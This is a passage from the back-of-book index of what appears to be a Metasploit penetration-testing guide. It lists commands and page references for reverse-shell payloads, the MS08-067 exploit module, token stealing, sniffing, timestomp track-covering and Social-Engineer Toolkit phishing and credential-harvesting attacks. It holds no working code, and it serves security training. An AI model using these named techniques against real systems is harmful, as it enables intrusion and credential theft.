class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 10pt;text-align: left;">restrictions for, 204–206</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">three-byte overwrite of the, 207</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">SEH chain option, Immunity Debugger, 201, 208</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">send_request_cgi <span class="s42">method, 130</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: center;">separate process, automigrating to, 282 Server Message Block (SMB). <span class="s41">See </span>SMB (Server Message Block)</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">service_(name) <span class="s42">function, 243 </span>sessions -c <span class="s58">cmd </span><span class="s42">command, 277 </span>sessions -i 1 <span class="s42">command, 68 </span>sessions -i sessionid<span class="s42">, 86 </span>sessions -K <span class="s42">command, 277</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">sessions -l <span class="s42">command, 68, 86, 276</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">sessions -l -v <span class="s42">command, 68, 277 </span>sessions -s <span class="s58">script </span><span class="s42">command, 277 </span>sessions -u 1 <span class="s42">command, 96 </span>sessions -u <span class="s42">command, 95</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">sessions -u <span class="s58">sessionID </span><span class="s42">command, 277</span></p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">SET (Social-Engineer Toolkit), 135–161</p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">AUTO_DETECT <span class="s42">setting</span></p><p class="s56" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">OFF <span class="s42">option, 137</span></p><p class="s56" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">ON <span class="s42">option, 136</span></p><p class="s41" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">config/set_config <span class="s42">file, 136</span></p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">configuring, 136–137</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Infectious Media Generator, 157 spear-phishing attack vector, 137–142 Teensy USB HID attack vector,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">157–160</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">web attack vectors, 142</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">client-side web exploits, 146–148 Java applet attack, 142–146</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;line-height: 11pt;text-align: left;">man-left-in-the-middle attack, 150</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">multi-attack vector, 153–157</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">tabnabbing attack, 150 username and password</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">harvesting, 148–150</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">web jacking attack, 151–152</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set autorunscript migrate -f</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">command, 276</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set <span class="s42">command, 63</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set_config <span class="s42">file, 142</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">setdesktop <span class="s58">number </span><span class="s42">command, 278</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set <span class="s58">function </span><span class="s42">command, 276</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">setg <span class="s42">command, 64, 96</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">setg <span class="s58">function </span><span class="s42">command, 276 SET Interactive Shell, 160 </span>set LHOST <span class="s42">command, 67</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set payload <span class="s58">payload </span><span class="s42">command, 276</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set payload windows/shell/reverse_tcp</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">command, 61</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">set target <span class="s58">num </span><span class="s42">command, 276 SET Web-GUI, 160</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SHA1 checksum, 242</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SHA256 checksum, 242</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">shell, upgrading to Meterpreter, 95–97</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SHELL32.DLL<span class="s42">, Windows XP SP2, 221</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">shellcode, 8, 12–13</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">shell <span class="s42">command, 68, 278</span></p><p class="s42" style="padding-left: 90pt;text-indent: -1pt;text-align: center;"><span class="s56">shell_reverse_tcp </span>payload, 100 <span class="s57">SHIFT</span>-F9 shortcut, in Immunity Debugger, 208</p><p class="s56" style="padding-left: 83pt;text-indent: 0pt;text-align: center;">shikata_ga_nai <span class="s42">encoder, 103, 104, 281</span></p><p class="s56" style="padding-left: 83pt;text-indent: 0pt;text-align: center;">show <span class="s42">command, 58-63, 65, 56, 67, 68,</span></p><p class="s42" style="padding-left: 94pt;text-indent: 0pt;text-align: center;">118, 124, 191, 275, 276</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">show_options <span class="s42">command, 51</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">-sI <span class="s42">flag, 23</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">signatures, 99</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Simple Mail Transport Protocol (SMTP), 137, 260</p><p class="s42" style="padding-top: 3pt;padding-left: 48pt;text-indent: -32pt;text-align: left;">Simple Network Management Protocol (SNMP), 30–31, 269</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">simple_tcp.rb <span class="s42">script, 32</span></p><p class="s42" style="padding-left: 27pt;text-indent: -10pt;text-align: left;">simulated penetration test, 251–266 attacking Apache Tomcat, 260–262 attacking obscure services, 262–264 covering tracks from, 264–266 customizing <span class="s41">msfconsole</span>, 255–257</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exploitation, 255</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">intelligence gathering, 252–253</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">planning, 252</p><p class="s42" style="padding-left: 37pt;text-indent: -10pt;text-align: left;">post exploitation, 257–260 identifying vulnerable services,</p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;line-height: 11pt;text-align: left;">259–260</p><p class="s42" style="padding-left: 48pt;text-indent: -10pt;text-align: left;">scanning Metasploitable system, 258–259</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">threat modeling, 253–255</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Single Target option, Fast-Track, 169</p><p class="s56" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">Site Cloner <span class="s42">option, SET main menu, 144, 147, 149, 151, 154</span></p><p class="s42" style="padding-left: 27pt;text-indent: -10pt;text-align: left;">SMB (Server Message Block) scanning of, 26–27</p><p class="s42" style="padding-left: 48pt;text-indent: -21pt;text-align: left;">vulnerability scanning for logins, 51–52</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">smb_login <span class="s42">module, 51</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SMBPass <span class="s42">variable, 85</span></p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">smb/psexec <span class="s42">module, 84–85</span></p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">smb_version <span class="s42">module, 26, 27</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SMPIPE <span class="s42">option, 10</span></p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">SMTP (Simple Mail Transport Proto- col), 137, 260</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">sniffer_dump <span class="s58">interfaceID pcapname</span></p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">command, 279</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">sniffer_interfaces <span class="s42">command, 279</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">sniffer_start <span class="s58">interfaceID packet-buffer</span></p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">command, 279</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">sniffer_stats interfaceID</p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">command, 279</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">sniffer_stop interfaceID <span class="s42">command, 279 SNMP (Simple Network Management</span></p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">Protocol), 30–31, 269</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Social-Engineer.org site, 135</p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">Social-Engineer Toolkit (SET). <span class="s41">See </span>SET (Social-Engineer Toolkit)</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">sock.put <span class="s42">command, 219</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">&#39;Space&#39; <span class="s42">declaration, 205</span></p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">spear-phishing attack vector, 110, 137–142, 145</p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">Spear-Phishing Attack Vectors option, SET main menu, 139</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">SQL authentication, MSSQL Bruter, 168</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">SQL injection</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">attempting to leverage, 254 error message, 255</p><p class="s56" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">SQL Injector - Query String Parameter Attack <span class="s42">option, 166</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SQL Ping attempt, Fast-Track, 169 SQL Server 2005 Services option, SQL</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">Server Configuration Manager window, 270</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">SQL Server Authentication option, SQL Server Management Studio Express, 272</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SQL Server Browser service, 270, 271 SQL Server Configuration Manager win-</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">dow, 270–271</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">SQL Server Management Studio Express option, Windows XP, 272</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">SQL Server (SQLEXPRESS) option, SQL Server Configuration Manager window, 270</p><p class="s56" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">SQLPwnage<span class="s42">, Microsoft SQL injection, 172–174</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SRVHOST <span class="s42">option, 117</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SRVPORT <span class="s42">option, 117</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><span class="s56">-sS </span>flag, <span class="s41">nmap</span>, 19</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SSH (Secure Shell), 28, 259</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">ssh_version <span class="s42">module, 28</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SSL (Secure Sockets Layer), 31</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">-sT <span class="s42">flag, 65</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">stand-alone exploits, 215</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Start Mode option, SQL Server Browser service, 270</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Start MSF option, <span class="s41">armitage</span>, 11</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Start option, SQL Server Configuration Manager window, 271</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Status Report <span class="s42">email template, 140 </span>steal_token <span class="s42">command, 88 </span>steal_token <span class="s58">PID </span><span class="s42">command, 278 Stealth TCP connect, 65</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">stealth TCP scan, 252</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">stored procedure, in SQL Server 2005 and 2008, 186</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Structured Exception Handler (SEH). <span class="s41">See </span>SEH (Structured Exception Handler)</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Subnet1.xml <span class="s42">file, 21</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">sudo <span class="s42">feature, 248</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">surgemail.exe <span class="s42">file, 200, 204</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">surgemail <span class="s42">service, 201–202</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SurgeMail vulnerability, 204</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SVN certificate, 274</p><p class="s42" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">svn update command, 274 SYN Port Scanner, 25 <span class="s41">sysadmin </span>role, 186</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sysinfo <span class="s42">command, 81, 277</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">SYSTEM-level permissions, 79</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">T</p><p class="s56" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">t <span class="s42">switch, in </span>db_autopwn <span class="s42">command, 56</span></p><p class="s57" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">TAB <span class="s42">key, 95, 235</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">tabnabbing attack, 150</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">targeted scanning, 26–31</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">FTP scanning, 29</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">for Microsoft SQL Servers, 27–28 SMB scanning, 26–27</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">SNMP sweeping, 30–31 SSH server scanning, 28</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">target machines, 267–274</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">Linux, 268</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">setting up, 267–268</p><p class="s42" style="padding-left: 37pt;text-indent: -10pt;text-align: left;">Windows XP, 269–274 configuring web server on, 269</p><p class="s42" style="padding-left: 48pt;text-indent: -10pt;text-align: left;">creating vulnerable web applica- tion, 271–272</p><p class="s42" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">MS SQL server on, 269–271 updating Back|Track, 272–274</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">[target[&#39;Ret&#39;]].pack(&#39;V&#39;)<span class="s42">, 221 target return address, 221</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">&#39;Targets&#39; <span class="s42">section, 206, 207, 221, 222,</span></p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">230</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Task Manager, Windows, 117</p><p class="s42" style="padding-left: 26pt;text-indent: -10pt;text-align: left;">TCP (Transmission Control Protocol) Dynamic Ports option, TCP/IP</p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Properties dialog, 270</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">idle scan, 2223</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">port 80, 36</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">port 443, 70, 112, 114</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">port 1433, 27, 76–77, 168, 270</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">port 4444, 62</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">random dynamic port, 27 scanning with, 19</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">TCP/IP option, 270</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">TCP/IP Properties dialog, 270 technical findings, 4</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Teensy USB HID attack vector, 157–160</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Temp <span class="s42">directory, 192</span></p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">template.pdf <span class="s42">file, 139</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Tenable Security, 44 terminology, in Metasploit, 7–8 <span class="s41">text.rb </span>file, 223</p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">TFTP (Trivial File Transfer Protocol), 228–231</p><p class="s56" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">THREADS <span class="s58">number </span><span class="s42">option, 27</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">THREADS <span class="s42">option, 126</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">THREADS <span class="s42">value, 22–23, 25, 125</span></p><p class="s42" style="padding-left: 101pt;text-indent: -10pt;text-align: left;">threat modeling phase of PTES, 2–3</p><p class="s42" style="padding-left: 90pt;text-indent: 10pt;text-align: left;">simulated penetration test, 253–255 three-byte overwrite, of SEH, 207</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">time-based iframe replacement, 151</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">timestomp <span class="s42">command, 264, 279</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">token impersonation, with Meterpreter, 87–89</p><p class="s41" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">toor <span class="s42">password, in PostgreSQL database, 20</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Total size <span class="s42">value, 205</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Transmission Control Protocol (TCP). <span class="s41">See </span>TCP (Transmission Control Protocol)</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Trivial File Transfer Protocol (TFTP), 228–231</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Trojan backdoor, 125</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Turn off Automatic Updates option, Windows XP, 269</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Twitter, auxiliary module, 129 types of penetration testing, 4–5</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">U</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">UAC (User Account Control), 243, 248</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Ubuntu, 68–71, 259–260, 267–268</p><p class="s42" style="padding-left: 101pt;text-indent: -10pt;text-align: left;">UDP (User Datagram Protocol) port 69, 228</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">port 1434, 27, 77, 168</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">uictl enable keyboard/mouse</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">command, 279</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">unset <span class="s42">command, 63</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">unsetg <span class="s42">command, 64 upgrading command shell, to</span></p><p class="s42" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">Meterpreter, 95–97 <span class="s56">upload </span><span class="s58">file </span>command, 279 <span class="s41">UPX </span>packer, 107–108</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">URIPATH <span class="s42">option, 117</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">usage <span class="s42">function, 238</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use <span class="s42">command, 51, 60, 125, 126, 132, 249</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use incognito <span class="s42">command, 88, 278 </span>use multi/handler <span class="s42">command, 94 </span>use <span class="s58">name </span><span class="s42">command, 276</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use priv <span class="s42">command, 83, 86, 119, 278</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use scanner/http/webdav_scanner</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">command, 125</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use scanner/mssql/mssql_ping</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">command, 78</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use scanner/portscan/syn <span class="s42">command, 25</span></p><p class="s56" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">use scanner/snmp/snmp_login <span class="s42">module, 30</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">use sniffer <span class="s42">command, 279</span></p><p class="s56" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Use them all - A.K.A. &#39;Tactical Nuke&#39; option<span class="s42">, SET main menu, 154</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">use windows/smb/ms08_067_netapi</p><p class="s42" style="padding-left: 42pt;text-indent: 0pt;text-align: center;">command, 59</p><p class="s56" style="padding-left: 42pt;text-indent: 0pt;text-align: center;">UsePowerShell <span class="s42">method, 190, 191</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">User Account Control (UAC), 243, 248 User Datagram Protocol (UDP). <span class="s41">See</span></p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">UDP (User Datagram Protocol)</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">User Mapping option, User Properties window, 272</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">User Properties window, 272</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">user32.dll<span class="s42">, 97</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">username harvesting, 148–150 utilities, for Metasploit, 12–14</p><p class="s41" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfencode<span class="s42">, 13</span></p><p class="s41" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfpayload<span class="s42">, 12–13</span></p><p class="s41" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">nasm shell<span class="s42">, 13–14</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">V</p><p class="s42" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">variables, using uppercase characters, 63 VBScript, 95</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">VenueID, 132</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">version <span class="s42">command, 72</span></p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">virtual network computing (VNC) authentication, 52–54</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">VMware Player, 268</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">.vmx <span class="s42">file, 268</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">VNC (remote GUI), getting, 283 VNC (virtual network computing)</p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">authentication, 52–54</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">vnc_none_auth <span class="s42">command, 53</span></p><p class="s41" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">vncviewer<span class="s42">, connecting to VNC with no authentication, 53</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">VNC window, 92</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">vulnerability scanning, 35–73</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">defined, 5</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">with Nessus, 44–51</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">configuring, 44–45 creating scan policy, 45–47</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">importing report from, 48–49 reports in, 47–48</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;line-height: 10pt;text-align: left;">running scan, 47</p><p class="s42" style="padding-left: 49pt;text-indent: -10pt;text-align: left;">scanning from within Metasploit, 49–51</p><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: right;">with NeXpose, 37–44</p><p class="s42" style="text-indent: 0pt;text-align: right;">configuring, 37–42</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">importing report from, 42–43 running within <span class="s41">msfconsole</span>, 43–44</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 10pt;text-align: left;">for open VNC authentication, 52–54</p><p class="s42" style="padding-top: 3pt;padding-left: 101pt;text-indent: 0pt;text-align: left;">for open X11 servers, 54–56 overview, 36–37</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">phase of PTES, 3</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">using results in Autopwn tool, 56 for valid SMB logins, 51–52</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">vulnerable services, identifying, 259–260</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">W</p><p class="s56" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">WEBATTACK_EMAIL <span class="s42">flag</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">OFF <span class="s42">option, 136</span></p><p class="s56" style="padding-left: 90pt;text-indent: 10pt;text-align: left;">ON <span class="s42">option, 136, 142 web attack vectors, 142</span></p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">client-side web exploits, 146–148 Java applet attack, 142–146</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">man-left-in-the-middle attack, 150</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">multi-attack vector, 153–157</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">tabnabbing attack, 150</p><p class="s42" style="padding-left: 122pt;text-indent: -21pt;text-align: left;">username and password harvesting, 148–150</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 10pt;text-align: left;">web jacking attack, 151–152, 153154</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">WebDAV, 127–128</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">webdav_scanner <span class="s42">module, 125</span></p><p class="s42" style="padding-left: 90pt;text-indent: -3pt;text-align: center;">web jacking attack, 151–152, 153–154 <span class="s56">Web Jacking Attack Method </span>option, SET main menu, 151, 154</p><p class="s42" style="text-indent: 0pt;text-align: right;">web server, configuring on</p><p class="s42" style="text-indent: 0pt;text-align: right;">Windows XP, 269</p><p class="s56" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Website Attack Vectors <span class="s42">option, SET main menu, 144, 147, 149</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">website clone, 